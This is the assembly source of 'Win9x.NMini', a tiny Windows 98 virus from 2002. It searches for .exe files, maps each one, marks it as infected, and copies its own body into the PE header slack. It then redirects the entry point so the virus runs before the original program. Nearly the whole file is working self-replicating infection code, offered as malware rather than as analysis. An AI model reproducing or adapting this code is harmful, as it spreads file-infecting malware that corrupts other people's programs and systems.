;                              -------------
; 			       -Win9x.NMini-
;			       -------------
;
;		        (c) necr0mancer   Jan-2002
;
;* Small Pe-infector size is 139 bytes.
;* Use "linear kernel32 call":100% works on my Win98;)
;* Detects by AV bz very simple.
;

include  win.inc

includelib import32.lib
extrn	ExitProcess:near

OF_READWRITE		equ 2
FILE_BEGIN      	equ 0
FILE_MAP_ALL_ACCESS	equ 2

	        .386
	        .model flat,stdcall
	        .data
		 dd  00
		.code

_start:                                              
;	        int 3
		xchg eax,esi					;esi=virii body

		db 68h						;push old RVA
oldRVA		dd offset carrier

		xchg eax,edi
		mov ah,4					;eax=400h
		xchg eax,ebp					

		sub esp,ebp					;bufer=esp-400h
		mov edi,esp					;edi=bufer

		jmp find
		fmask          db '*.exe',0
find:
        	lea eax,[esi+(offset fmask-offset _start)]	
	        push edi					;bufer
	        push eax                                        ;mask

		mov eax,0BFF77B5Bh				;FIND_FIRST
	        call  eax

		xchg eax,ebx					;ebx=handle

infect:
		pusha

	        lea edx,[edi].ff_fullname     			;esi=finded name

		;==Open file===
		push OF_READWRITE
		push edx
		mov eax,0BFF774BEh
		call eax

		inc eax
		jz __next
		dec eax

;===============================================================================

map_file:
		;ebx=handle of file
	        xor edi,edi					;edi=0

	        push edi			    		;name
	        push edi                     			;lowsize
	        push edi 	                    		;highsize
	        push PAGE_READWRITE
	        push edi
       		push eax					;file handle

		mov eax,0BFF7769Eh				;CreateFileMapping
       		call eax

;	        xchg ebx,eax
;	        xor ecx,ecx

	        push edi				    	;count bytes
       		push edi  	                        	;lowsize
       		push edi                              		;highsize
	        push FILE_MAP_ALL_ACCESS

       		push eax					;handle
		mov eax,0BFF82097h				;MapViewOfFile
	        call eax

;               xchg edi,eax				 	;edx=mem adr	

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
		;eax=mem base

		cmp byte ptr[eax+18h],40h
	        jne __next

		inc byte ptr[eax+18h]				;set label infect

		mov edi,[eax+3Ch]				;EDX=PE-header
		add edi,eax				

	        mov ebx,[edi+28h]				;ebx=RVA
		add ebx,[edi+34h]       	        	;ebx=RVA+image base

		mov ebp,[edi+54h]				;ebp=headers size
                inc byte ptr[edi+54h+1]				;header size+256

		mov [edi+28h],ebp
	

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

		;eax=mapviev

		add eax,ebp					;ecx=virii dest
		mov edi,eax					;edi=dest.

		push (offset _fbodyend-offset _start)/4+1
		pop ecx
		rep movsd					;copy virii

		mov [eax+(offset oldRVA - offset _start)],ebx	;save RVA
__next:
		popa
					                        ;save data for FNext
		push edi                                 	;SearchRec offset
		push ebx		                 	;search handle
		mov eax,0BFF77B93h		         	;FindNextFile
		call eax

		dec eax
		jz infect					;errror ocures?

find_exit:
 		add esp,ebp					;add esp,1024
	        ret
_fbodyend:
db 10,13,10,13,10,13, '=======================',10,13
db 		      '=  Size is '
db (offset _fbodyend-offset _start)/1000 MOD 10 +'0'
db (offset _fbodyend-offset _start)/100  MOD 10 +'0'
db (offset _fbodyend-offset _start)/10   MOD 10 +'0'
db (offset _fbodyend-offset _start)/1    MOD 10 +'0'
db		                    ' bytes =',10,13
db '=======================',10,13,10,13,10,13


;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
;				Original program
;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
carrier:
		push 0
		call ExitProcess
end     _start